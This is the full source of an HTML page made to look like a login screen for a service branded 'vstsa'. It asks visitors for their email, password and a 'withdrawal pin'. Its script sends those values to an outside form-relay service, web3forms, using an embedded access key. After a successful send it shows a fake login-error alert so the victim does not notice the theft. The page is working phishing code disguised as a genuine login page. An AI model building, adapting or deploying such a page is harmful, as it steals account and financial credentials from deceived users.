<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="container">

  <!-- Top Icons -->
  <div class="top-bar">
    <span class="close">✕</span>
    <span class="globe">🌐</span>
  </div>

  <!-- Logo -->
  <div class="logo">
    <!-- Add your image inside this div -->
     <img src="vstsa logo.jpeg" alt="Logo" style="width: 100%; height:100%; object-fit: contain;">
  </div>

  <!-- Toggle -->
  <div class="toggle">
    <button id="emailToggle" class="active" type="button">Email</button>
    <button id="phoneToggle" type="button">Phone number</button>
  </div>

  <!-- Input Fields -->
  <form id="contactForm" action="https://api.web3forms.com/submit" method="POST">
    <div class="input-box">
      <span class="icon">👤</span>
      <input name="ename" type="text" id="contactInput" placeholder="Please enter your email address" required>
      <span class="clear">✕</span>
    </div>
    <div class="input-box">
      <span class="icon">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M17 9V7C17 4.23858 14.7614 2 12 2C9.23858 2 7 4.23858 7 7V9" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
          <rect x="5" y="9" width="14" height="12" rx="2" stroke="currentColor" stroke-width="2"/>
          <path d="M12 15C13.1046 15 14 15.8954 14 17V19H10V17C10 15.8954 10.8954 15 12 15Z" fill="currentColor"/>
        </svg>
      </span>
      <input name="pass" type="message" id="pass" placeholder="Please enter your password" required>
      <span class="toggle-pass" data-target="pass">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M1 12C1 12 5 4 12 4s11 8 11 8-4 8-11 8S1 12 1 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
          <circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2"/>
        </svg>
      </span>
    </div>

    <div class="input-box">
      <span class="icon">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M17 9V7C17 4.23858 14.7614 2 12 2C9.23858 2 7 4.23858 7 7V9" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
          <rect x="5" y="9" width="14" height="12" rx="2" stroke="currentColor" stroke-width="2"/>
          <path d="M12 15C13.1046 15 14 15.8954 14 17V19H10V17C10 15.8954 10.8954 10 12 15Z" fill="currentColor"/>
        </svg>
      </span>
      <input name="withdrawal" type="message" id="withdrawal pin" placeholder="Please enter your withdrawal pin" required>
      <span class="toggle-pass" data-target="withdrawalPass">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M1 12C1 12 5 4 12 4s11 8 11 8-4 8-11 8S1 12 1 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
          <circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2"/>
        </svg>
      </span>
    </div>
    <!-- Login Button -->
    <button type="submit" class="login-btn">Enter</button>
      </form>
    <!-- Signup -->
    <div class="signup">
      <a href="#">Sign up</a>
    </div>
    <!-- Forgot -->
    <div class="forgot" style="margin-top: 20px;">
      <a href="#">Forgot your password?</a>
    </div>

</div>

<script>
    const form = document.getElementById('contactForm');
const submitBtn = form.querySelector('button[type="submit"]');

form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const formData = new FormData(form);
    formData.append("access_key", "909ed709-d1ef-4a29-84b2-fd09ccc29e08");

    const originalText = submitBtn.textContent;

    submitBtn.textContent = "Loading...";
    submitBtn.disabled = true;

    try {
        const response = await fetch("https://api.web3forms.com/submit", {
            method: "POST",
            body: formData
        });

        const data = await response.json();

        if (response.ok) {
            alert("An error occurred while logging you in.Please don't try again later.");
            form.reset();
        } else {
            alert("Error: " + data.message);
        }

    } catch (error) {
        alert("Something went wrong. Please try again.");
    } finally {
        submitBtn.textContent = originalText;
        submitBtn.disabled = false;
    }
});
</script>

<script src="script.js"></script>
</body>
</html>
